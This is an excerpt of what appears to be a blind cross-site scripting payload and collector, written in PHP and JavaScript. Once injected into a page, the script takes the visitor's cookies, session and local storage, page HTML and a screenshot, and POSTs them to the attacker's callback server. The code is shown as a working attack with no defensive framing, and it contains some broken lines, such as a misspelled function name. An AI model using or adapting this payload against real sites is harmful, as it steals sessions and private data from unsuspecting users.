...
$_config = [
    'image_path' => 'images/', // relative please!
    'report' => [
        'file' => [
            'enabled' => false,
            'path' => 'xss.log',
...
{
    window.setTimeout( doCollectDatas, 2000 );
}

function doCollectDatas()
{
    var callback = '<?php echo "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';

    var t_datas = new Object();
    t_datas['origin']          = document.location.origin;
    t_datas['user_agent']      = navigator.userAgent;
    t_datas['target_url']      = document.URL;
    t_datas['referrer_url']    = document.referrer;
    t_datas['cookies']         = document.cookie;
    t_datas['session_storage'] = JSON.stringify(sessionStorage);
    t_datas['local_storage']   = JSON.stringify(localStorage);
    t_datas['document_html']   = document.documentElement.outerHTML;

    try {
        html2canvas(document.body).then(function(canvas) {
            t_datas['screenshot'] = canvas.toDataURL();
            sendDatas( callback, t_datas );
        }, function() {
            t_datas['screenshot'] = '';
            sendDatas( callback, t_datas );
        });
...
function sendDatas( callback, t_datas )
{
    var xhr = new XMLHttpRequest();
    xhr.open( 'POST', callback, true );
    xhr.setRequestHeader( 'Content-type', 'application/x-www-form-urlencoded' );
    xhr.send( 'datas=' + JSON.stringify(t_datas) );
}
...
if( document.readyState == 'complete' ) {
    ...
    if( window.addEventListener ) {
        window.addEventListener( 'load', collectDatas(), false );
    } else if( window.attachEvent ) {
        window.attachEvent( 'onload', collecDatas() );
    }
}
